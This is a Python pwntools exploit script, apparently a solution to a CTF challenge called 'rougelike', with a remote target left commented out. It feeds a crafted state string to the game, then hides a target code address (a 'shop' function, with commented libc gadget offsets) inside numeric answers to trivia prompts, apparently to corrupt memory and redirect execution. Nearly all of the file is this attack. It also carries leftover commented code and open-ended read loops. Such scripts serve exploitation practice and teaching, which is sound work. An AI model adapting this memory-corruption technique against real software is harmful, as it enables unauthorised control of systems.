
import os
import pwn
import sys
import random

pwn.context.log_level = 'error'




conn = pwn.process('./rougelike.bin')
#conn = pwn.remote('challenges.crysys.hu', 5010)
conn.sendlineafter('>', '1')
conn.sendlineafter('>', '5')
conn.sendlineafter('state: ', '66666666666666666666666666666666666666666666666610888888')
conn.sendlineafter('>', '2')
conn.sendlineafter('? ', 'yes')
def addr_from_libc(addr):

    libc_base = 0x00007ffff7ca0c50 - 0x27c50
    return addr + libc_base

addr = 0x0000555555561a40 # shop
# addr = addr_from_libc(0xcac01)
# addr = addr_from_libc(0xcabfe)
# addr = addr_from_libc(0xcac04)


addr_lower = ((addr & 0xffffffff) << 32) + 0x11111111
addr_upper = (addr >> 32)


print(hex(addr_lower))
print(hex(addr_upper))

for i in range(15):
    r = conn.recvuntil('? ').decode('utf-8')
    print(r)
    if 'Linux released' in r:
        conn.sendline(str(addr_lower))
    elif 'SecChallenge' in r:
        conn.sendline(str(addr_upper))
    else:
        conn.sendline('1')

r = conn.recvuntil('>').decode('utf-8')
print(r)
conn.sendline('2')
while True:
    r = conn.recvline().decode('utf-8')
    print(r)
# print('x')
# conn.sendlineafter('What is the best number?', '1')
# conn.sendlineafter('What is the 19th happy prime?', '1')
# conn.sendlineafter('What is the order of the Lyons group?', '1')
# conn.sendlineafter('Sum all natural numbers; take the reciprocal, then multiply it by -1. What do you get?', '1')
# conn.sendlineafter('What is the reciprocal of the fine structure constant?', '1')
# conn.sendlineafter('AAAAAAAA (hint: https://www.youtube.com/watch?v=bknybcgfjAk)?', '1')
# conn.sendlineafter('What was the Unix timestamp when this challenge was developed?', '1')
# conn.sendlineafter('When did Richard Stallman started the GNU project?', '1')
# conn.sendlineafter("How many times does the unsafe keyword appear in the source code of the Rust standard library's source code?", '1')
# conn.sendlineafter("When was the first version of Linux released?", '1')
# conn.sendlineafter("How many challenges remained unsolved during last year's SecChallenge?", '1')
# conn.sendlineafter("What is the closest even prime", '1')


while True:
    r=conn.recvline().decode('ascii')
    print(r)
    conn.sendline('1')
# r = conn.recvline().decode('ascii')
# conn.sendline(str(len(fileContent)))
# r = conn.recvline().decode('ascii')
# conn.send(fileContent)
# r = conn.recvall().decode('ascii')
# print(r)
# conn.close()


# if addr == 0x41c020:
#     print(i)
#     break
